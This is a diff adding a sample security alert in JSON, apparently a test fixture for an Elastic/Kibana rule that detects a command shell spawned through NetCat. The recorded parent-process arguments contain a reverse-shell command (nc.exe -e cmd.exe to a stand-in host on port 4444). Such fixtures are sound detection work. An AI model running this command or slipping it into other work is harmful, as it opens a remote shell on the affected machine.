@@ -1,0 +1,19 @@
+{
+  "@timestamp": "2026-11-06T18:05:12.000Z",
+  "kibana.alert.uuid": "sample-netcat-0001",
+  "kibana.alert.original_time": "2026-11-06T18:05:10.412Z",
+  "kibana.alert.rule.name": "Potential Command Shell via NetCat",
+  "kibana.alert.severity": "high",
+  "host": {"id": "test-win-host-0001", "name": "TEST-WIN10", "os": {"type": "windows"}},
+  "user": {"name": "labuser"},
+  "process": {
+    "entity_id": "sample-entity-shell-0001",
+    "name": "cmd.exe",
+    "pid": 4120,
+    "parent": {
+      "entity_id": "sample-entity-nc-0001",
+      "executable": "C:\\Users\\labuser\\Downloads\\nc.exe",
+      "args": ["nc.exe", "-e", "cmd.exe", "192.0.2.50", "4444"]
+    }
+  }
+}
